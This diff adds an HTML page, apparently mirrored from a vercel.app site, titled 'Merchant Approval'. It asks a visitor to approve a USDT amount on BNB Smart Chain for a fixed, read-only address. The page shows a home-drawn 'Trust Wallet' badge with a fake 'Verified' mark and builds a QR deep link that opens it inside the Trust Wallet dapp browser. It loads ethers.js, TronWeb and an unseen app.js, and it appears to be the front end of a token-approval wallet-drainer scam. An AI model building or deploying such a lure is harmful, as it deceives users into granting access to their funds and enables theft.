@@ -1,0 +1,172 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from https://test-3h4i.vercel.app/ by HTTrack Website Copier/3.x [XR&CO], Fri, 30 Oct 2026 15:42:06 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+	<meta name="dapp-browser" content="trust">
+	<meta name="mobile-web-app-capable" content="yes">
+	<title>Merchant Approval</title>
+	<link rel="stylesheet" href="css/main.css">
+	<script src="js/ethers.umd.min.js"></script>
+	<script src="js/app.js" defer=""></script>
+	<script src="../cdn.jsdelivr.net/npm/tronweb%405.3.3/dist/index.min.js"></script>   
+</head>
+<body>
+	<main class="screen">
+		<section class="form-shell" aria-label="Merchant approval form">
+
+			<!-- ── QR ─────────────────────────────────────────────────── -->
+			<div class="qr-section">
+				<div id="qrContainer" class="qr-frame"></div>
+				<p class="qr-hint">Escanear con la cámara</p>
+			</div>
+
+			<!-- ── Address ─────────────────────────────────────────── -->
+			<div class="field-block">
+				<label class="field-label" for="merchantAddress">Address or Domain Name</label>
+				<div class="address-field">
+					<input id="merchantAddress" class="address-input" type="text" autocomplete="off" spellcheck="false" readonly="" tabindex="-1">
+					<span class="addr-usdt-icon" aria-hidden="true">
+						<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+							<circle cx="16" cy="16" r="16" fill="#26a17b"></circle>
+							<path d="M17.9 17.2v-.1c0-1-.6-1.4-1.9-1.4s-1.9.4-1.9 1.4v.1c0 .9.6 1.3 1.9 1.3s1.9-.4 1.9-1.3zM22 8H10v2.7h4.4v1.9c-3 .2-5.2 1.1-5.2 2.2s2.2 2 5.2 2.2v5h3v-5c3-.2 5.2-1.1 5.2-2.2s-2.2-2-5.2-2.2v-1.9H22V8zm-6 7.7c-2.6 0-4.7-.7-4.7-1.6s2.1-1.6 4.7-1.6 4.7.7 4.7 1.6-2.1 1.6-4.7 1.6z" fill="#fff"></path>
+						</svg>
+					</span>
+				</div>
+			</div>
+
+			<!-- ── Destination Network ──────────────────────────────── -->
+			<div class="field-block network-block">
+				<p class="field-label">Destination Network</p>
+				<button class="network-pill" type="button" id="networkPill">
+					<span class="network-icon" aria-hidden="true" id="networkIcon">
+						<svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
+							<circle cx="16" cy="16" r="16" fill="#111216"/>
+							<path d="M16 5.5l3.8 3.8-3.8 3.8-3.8-3.8L16 5.5zm-6.7 6.7l3.8 3.8-3.8 3.8-3.8-3.8 3.8-3.8zm13.4 0l3.8 3.8-3.8 3.8-3.8-3.8 3.8-3.8zM16 16.3l3.8 3.8-3.8 3.8-3.8-3.8 3.8-3.8zm-6.7 6.7l3.8 3.8-1.9 1.9-3.8-3.8 1.9-1.9zm13.4 0l1.9 1.9-3.8 3.8-1.9-1.9 3.8-3.8z" fill="#F3BA2F"/>
+						</svg>
+					</span>
+					<span class="network-name" id="networkName">BNB Smart Chain</span>
+					<span class="network-caret" aria-hidden="true">▼</span>
+				</button>
+			</div>
+
+			<!-- ── Amount ────────────────────────────────────────────── -->
+			<div class="field-block">
+				<p class="field-label">Amount</p>
+				<div class="desc-field">
+					<input class="desc-text" type="text" value="0.1" autocomplete="off" spellcheck="false">
+					<div class="desc-actions">
+						<span class="desc-token">USDT</span>
+						<span class="desc-badge">Max</span>
+					</div>
+				</div>
+			</div>
+
+		</section>
+
+		<div class="page-spacer" aria-hidden="true"></div>
+
+		<footer class="bottom-bar">
+			<button id="approveBtn" class="primary-button" type="button">
+				<span id="btnText">NEXT</span>
+				<span id="btnSpinner" class="btn-spinner" hidden="" aria-hidden="true"></span>
+			</button>
+
+			<!-- ── Trust Wallet badge ────────────────────────────────── -->
+			<div class="trust-badge" aria-label="Powered by Trust Wallet">
+				<svg width="18" height="18" viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+					<defs>
+						<linearGradient id="twGrad" x1="0%" y1="0%" x2="100%" y2="100%">
+							<stop offset="0%" stop-color="#2D9FFF"/>
+							<stop offset="100%" stop-color="#00D4AA"/>
+						</linearGradient>
+					</defs>
+					<path d="M16 2L4 8v8c0 7.1 5.1 13.7 12 16 6.9-2.3 12-8.9 12-16V8L16 2z" fill="url(#twGrad)"/>
+					<path d="M13 13h6v2.5h-6V13zm0 4h6v2.5h-6V17z" fill="#fff"/>
+				</svg>
+				<span class="trust-badge-text">Trust Wallet</span>
+				<svg width="13" height="13" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" aria-label="Verified">
+					<defs>
+						<linearGradient id="twCheck" x1="0%" y1="0%" x2="100%" y2="100%">
+							<stop offset="0%" stop-color="#2D9FFF"/>
+							<stop offset="100%" stop-color="#00D4AA"/>
+						</linearGradient>
+					</defs>
+					<circle cx="8" cy="8" r="8" fill="url(#twCheck)"/>
+					<path d="M4.5 8l2.5 2.5 4.5-4.5" stroke="#fff" stroke-width="1.8" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
+				</svg>
+			</div>
+		</footer>
+
+		<div id="toast" class="toast" aria-live="polite" hidden=""></div>
+	</main>
+
+	<!-- ── QR Script ────────────────────────────────────────────────── -->
+	<script src="../cdn.jsdelivr.net/npm/qrcode%401.2.2/build/qrcode.min.js"></script>
+<script>
+(function() {
+  const pageUrl = window.location.origin + window.location.pathname;
+  const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${pageUrl}`;
+
+  const container = document.getElementById("qrContainer");
+  if (!container) return;
+
+  const canvas = document.createElement("canvas");
+  const SIZE = 320;
+  canvas.width = SIZE;
+  canvas.height = SIZE;
+  container.appendChild(canvas);
+
+  QRCode.toCanvas(canvas, deepLink, {
+    width: SIZE,
+    height: SIZE,
+    color: { dark: "#111216", light: "#ffffff" },
+    errorCorrectionLevel: "H"
+  }, function(err) {
+    if (err) return console.error("QR error:", err);
+
+    const ctx = canvas.getContext("2d");
+    const logoSize = 44;
+    const cx = SIZE / 2;
+    const cy = SIZE / 2;
+
+    // Fondo blanco (rect normal, sin roundRect)
+    ctx.fillStyle = "#ffffff";
+    ctx.fillRect(cx - logoSize/2 - 6, cy - logoSize/2 - 6, logoSize + 12, logoSize + 12);
+
+    // Círculo negro
+    ctx.fillStyle = "#111216";
+    ctx.beginPath();
+    ctx.arc(cx, cy, logoSize / 2, 0, Math.PI * 2);
+    ctx.fill();
+
+    // Diamantes BNB
+    const d = logoSize * 0.19;
+    ctx.fillStyle = "#F3BA2F";
+
+    function diamond(x, y, size) {
+      ctx.beginPath();
+      ctx.moveTo(x, y - size);
+      ctx.lineTo(x + size, y);
+      ctx.lineTo(x, y + size);
+      ctx.lineTo(x - size, y);
+      ctx.closePath();
+      ctx.fill();
+    }
+
+    diamond(cx, cy, d);
+    diamond(cx, cy - d * 2.2, d);
+    diamond(cx, cy + d * 2.2, d);
+    diamond(cx - d * 2.2, cy, d);
+    diamond(cx + d * 2.2, cy, d);
+  });
+})();
+</script>   
+
+</body>
+
+<!-- Mirrored from https://test-3h4i.vercel.app/ by HTTrack Website Copier/3.x [XR&CO], Fri, 30 Oct 2026 15:42:09 GMT -->
+</html>   
